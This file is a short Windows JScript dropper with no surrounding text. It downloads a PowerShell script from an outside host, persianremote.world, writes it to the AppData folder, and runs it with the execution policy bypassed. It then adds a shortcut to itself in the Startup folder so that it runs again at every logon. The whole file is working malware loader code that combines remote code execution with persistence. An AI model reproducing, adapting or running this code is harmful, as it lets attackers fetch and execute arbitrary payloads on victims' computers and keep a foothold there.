var url = 'http://persianremote.world/Company/knvfhiycyfokst.ps1'; // Replace with the URL of the .ps1 script
var ps1FileName = 'yourscript.ps1'; // The name of the downloaded .ps1 script
var appDataFolder = getFolderPath('AppData');
var ps1FilePath = appDataFolder + '\\' + ps1FileName;

var xhr = new ActiveXObject('MSXML2.ServerXMLHTTP.6.0');
xhr.open('GET', url, false);
xhr.send();

if (xhr.status === 200) {
  var fso = new ActiveXObject('Scripting.FileSystemObject');
  if (!fso.FolderExists(appDataFolder)) {
    fso.CreateFolder(appDataFolder);
  }

  var stream = new ActiveXObject('ADODB.Stream');
  stream.Open();
  stream.Type = 1; // Binary data
  stream.Write(xhr.responseBody);
  stream.Position = 0;
  stream.SaveToFile(ps1FilePath, 2); // Overwrite the file if it exists
  stream.Close();

  // Run the downloaded PowerShell script
  var shell = new ActiveXObject('WScript.Shell');
  shell.Run('cmd.exe /c powershell.exe -exec Bypass -File ' + ps1FilePath, 1, true);

  // Get the path of the currently running .js file and the .js file name
  var jsScript = WScript.ScriptFullName;
  var jsFilePath = fso.GetParentFolderName(jsScript);
  var jsFileName = fso.GetFile(jsScript).Name;

  // Create a shortcut for the .js file in the startup folder
  var startupFolderPath = shell.SpecialFolders('Startup');
  var lnkFilePath = startupFolderPath + '\\' + jsFileName.replace('.js', '.lnk');
  var shortcut = shell.CreateShortcut(lnkFilePath);
  shortcut.TargetPath = 'wscript.exe';
  shortcut.Arguments = '"' + jsScript + '"';
  shortcut.Save();
 
} else {
 
}

function getFolderPath(folderName) {
  var shell = new ActiveXObject('WScript.Shell');
  return shell.ExpandEnvironmentStrings('%' + folderName + '%');
}
